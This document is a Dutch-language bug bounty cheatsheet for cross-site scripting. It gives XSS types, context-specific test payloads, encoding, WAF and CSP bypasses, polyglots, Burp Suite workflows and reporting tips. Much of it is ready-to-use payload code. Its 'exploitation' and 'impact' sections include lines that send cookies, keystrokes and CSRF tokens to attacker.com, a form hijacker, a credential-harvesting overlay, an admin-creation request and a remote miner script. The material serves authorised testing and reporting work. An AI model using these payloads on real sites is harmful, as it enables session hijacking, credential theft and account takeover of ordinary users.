
# Cross-Site Scripting (XSS) - Bug Bounty Cheatsheet

## Basis XSS Types

### 1. Reflected XSS

- Payload wordt direct gereflecteerd in de response
- Vereist user interaction (klikken op malicious link)

### 2. Stored XSS

- Payload wordt opgeslagen in database
- Triggert automatisch bij het laden van de pagina
- Meest gevaarlijk type

### 3. DOM-based XSS

- Kwetsbaarheid in client-side JavaScript
- Payload wordt niet naar server gestuurd
- Exploit gebeurt volledig in de browser

## Basis Test Payloads

html

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video><source onerror="alert(1)">
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

## Context-Specific Payloads

### HTML Context

html

```html
"><script>alert(1)</script>
'><script>alert(1)</script>
</title><script>alert(1)</script>
</textarea><script>alert(1)</script>
--><!--><script>alert(1)</script>
```

### JavaScript Context

javascript

```javascript
'-alert(1)-'
';alert(1);//
\'-alert(1)//
</script><script>alert(1)</script>
```

### Attribute Context

html

```html
" onmouseover="alert(1)
' onmouseover='alert(1)
" autofocus onfocus="alert(1)
'autofocus onfocus='alert(1)
```

### URL/href Context

javascript

```javascript
javascript:alert(1)
javascript:alert(1)//
javascript:alert(1)%0A
data:text/html,<script>alert(1)</script>
```

## Filter Bypass Techniques

### Case Manipulation

html

```html
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>
```

### Encoding

html

```html
<!-- URL Encoding -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- HTML Entity Encoding -->
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- Unicode Encoding -->
\u003cscript\u003ealert(1)\u003c/script\u003e

<!-- Hex Encoding -->
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">

<!-- Decimal Encoding -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
```

### Null Bytes & Newlines

html

```html
<script>alert(1)</script>
<img src=x onerror=
alert(1)>
<svg/onload=alert(1)>
```

### Alternative Event Handlers

html

```html
<body onhashchange=alert(1)><a href=#>click
<body onpageshow=alert(1)>
<body ononline=alert(1)>
<body onresize=alert(1)>
<body onscroll=alert(1)>
```

### Tag Obfuscation

html

````html
<script>alert(1)</script>
<scr<script>ipt>alert(1)</scr</script>ipt>
```

## BurpSuite Workflows

### 1. Intruder voor Payload Testing
```
1. Capture request in Proxy
2. Send to Intruder (Ctrl+I)
3. Mark injection point met § symbols
4. Kies attack type: Sniper voor single parameter
5. Payload Lists:
   - Custom XSS wordlist
   - Fuzzing payloads
6. Grep Extract voor response analysis
7. Filter op "Set-Cookie", "Access-Control", reflections
```

### 2. Repeater voor Manual Testing
```
1. Send request to Repeater (Ctrl+R)
2. Modify parameter met payload
3. Send (Ctrl+Space)
4. Analyze response in Render tab
5. Check voor execution in browser
```

### 3. Scanner Configuration
```
Scan Settings:
- Enable all XSS checks
- Use thorough mode
- Custom insertion points
- Follow redirects
- Check stored XSS
````

## Browser Console Commands

### Detection

javascript

```javascript
// Check if payload executed
console.log('XSS Test');

// Document properties
document.domain
document.cookie
localStorage
sessionStorage

// Extract sensitive data
document.body.innerHTML
document.forms

// Check CSP
document.contentSecurityPolicy
```

### Exploitation Payloads

javascript

```javascript
// Cookie stealing
fetch('https://attacker.com/?c='+document.cookie)

// Session hijacking
new Image().src='https://attacker.com/?c='+document.cookie

// Keylogger
document.onkeypress=function(e){fetch('https://attacker.com/?k='+e.key)}

// Form hijacking
document.forms[0].action='https://attacker.com/steal'

// Screenshot (met html2canvas)
fetch('https://attacker.com/?data='+btoa(document.body.innerHTML))
```

## Advanced Techniques

### CSP Bypass

javascript

```javascript
// JSONP endpoints
<script src="https://trusted-site.com/jsonp?callback=alert"></script>

// AngularJS sandbox escape (oude versies)
{{constructor.constructor('alert(1)')()}}

// Vue.js
{{_c.constructor('alert(1)')()}}

// Base tag injection
<base href="https://attacker.com/">
```

### WAF Bypasses

html

```html
<!-- Akamai -->
<d3v/onauxclick=[2].some(confirm)>click

<!-- Cloudflare -->
<a/href=javascript&colon;alert(1)>click

<!-- AWS WAF -->
<script>&#x61;lert(1)</script>

<!-- Imperva -->
<svg/onload=alert`1`>

<!-- ModSecurity -->
<iframe/src="data:text/html,<svg onload=alert(1)>">
```

### Polyglot Payloads

javascript

```javascript
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

## Testing Checklist

- [ ]  Test alle input fields (forms, search boxes)
- [ ]  Test URL parameters
- [ ]  Test HTTP headers (User-Agent, Referer, X-Forwarded-For)
- [ ]  Test file uploads (filename, content)
- [ ]  Test JSON/XML inputs
- [ ]  Test DOM sinks (innerHTML, document.write)
- [ ]  Check voor stored XSS in:
    - Comments
    - User profiles
    - Forum posts
    - Admin panels
- [ ]  Test verschillende browsers
- [ ]  Check Content-Security-Policy headers
- [ ]  Test voor Self-XSS escalatie
- [ ]  Check voor XSS in error messages
- [ ]  Test postMessage handlers

## Impact Demonstratie voor Reports

### High Impact Scenarios

javascript

```javascript
// Account takeover via admin session
fetch('/api/admin/users', {
  method: 'POST',
  body: JSON.stringify({user:'attacker',role:'admin'}),
  headers: {'Content-Type':'application/json'}
})

// Crypto mining
<script src="https://attacker.com/miner.js"></script>

// Credential harvesting
document.body.innerHTML='<form action=https://attacker.com><input name=password type=password><input type=submit></form>'

// CSRF token extraction
fetch('/account').then(r=>r.text()).then(t=>fetch('https://attacker.com/?token='+t.match(/csrf_token="(.*)"/)[1]))
```

## Tools & Resources

**Automated Scanners:**

- XSStrike
- Dalfox
- XSSer
- Nuclei templates

**Payload Lists:**

- PayloadsAllTheThings
- AwesomeXSS
- XSS Polyglots
- OWASP XSS Filter Evasion Cheat Sheet

**Browser Extensions:**

- XSS Hunter
- Hackvertor
- KNOXSS

## Reporting Tips

1. **Severity Rating:**
    - Critical: Stored XSS in admin panel
    - High: Reflected XSS met session hijacking
    - Medium: Self-XSS met social engineering
    - Low: XSS met strict CSP
2. **PoC Requirements:**
    - Payload that executes
    - Steps to reproduce
    - Video/screenshot
    - Impact demonstration
3. **Write-up Structure:**
    - Vulnerability type
    - Affected endpoint
    - Reproduction steps
    - Payload
    - Impact analysis
    - Remediation advice